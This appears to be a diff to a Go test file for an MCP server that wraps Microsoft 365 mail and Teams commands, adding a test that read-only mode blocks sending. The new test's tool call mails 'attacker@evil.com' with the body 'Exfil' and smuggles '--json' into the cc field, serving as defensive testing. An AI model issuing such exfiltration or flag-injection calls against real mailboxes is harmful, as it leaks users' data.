@@ -7,6 +7,7 @@ import (
 	"testing"
 
 	"github.com/masonhuemmer/m365/internal/adapters/graph"
+	"github.com/masonhuemmer/m365/internal/domain"
 	"github.com/modelcontextprotocol/go-sdk/mcp"
 )
 
@@ -84,6 +85,7 @@ func TestMCPExactRecipientDoesNotUseFuzzyMatch(t *testing.T) {
 	for i := range mem.Chats {
 		if mem.Chats[i].ID == "chat-ajay" {
 			mem.Chats[i].Members[0].ID = "01234567-89ab-cdef-0123-456789abcdef"
+			mem.Chats[i].Members = append(mem.Chats[i].Members, domain.Person{Address: "user@example.com"})
 		}
 	}
 	before := len(mem.Sent)
@@ -170,5 +172,36 @@ func TestMCPPolicyRejectsFlagKeyInjection(t *testing.T) {
 	}
 	if got := len(d.Teams.(graph.TeamsAPI).Memory.Sent); got != 0 {
 		t.Fatalf("teams message sent despite rejection: %d", got)
+	}
+}
+
+func TestMCPReadOnlyDoesNotSendWhenFlagValueLooksGlobal(t *testing.T) {
+	d, _, _ := testDeps()
+	loginAll(t, &d)
+	ctx := context.Background()
+	t1, t2 := mcp.NewInMemoryTransports()
+	ss, err := NewMCPServerWithPolicy(d, MCPPolicy{ReadOnly: true}).Connect(ctx, t1, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer ss.Close()
+	cs, err := mcp.NewClient(&mcp.Implementation{Name: "test", Version: "1"}, nil).Connect(ctx, t2, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer cs.Close()
+	res, err := cs.CallTool(ctx, &mcp.CallToolParams{Name: "m365_run", Arguments: runIn{
+		Namespace: "mail", Verb: "send", Flags: map[string]any{
+			"to": "attacker@evil.com", "subject": "Invoice", "body": "Exfil", "cc": "--json",
+		},
+	}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(d.Mail.(graph.MailAPI).Memory.Sent) != 0 {
+		t.Fatal("mail sent without write opt-in")
+	}
+	if res.IsError || !strings.Contains(toolText(t, res), "dry_run") {
+		t.Fatalf("expected a dry-run preview: %s", toolText(t, res))
 	}
 }
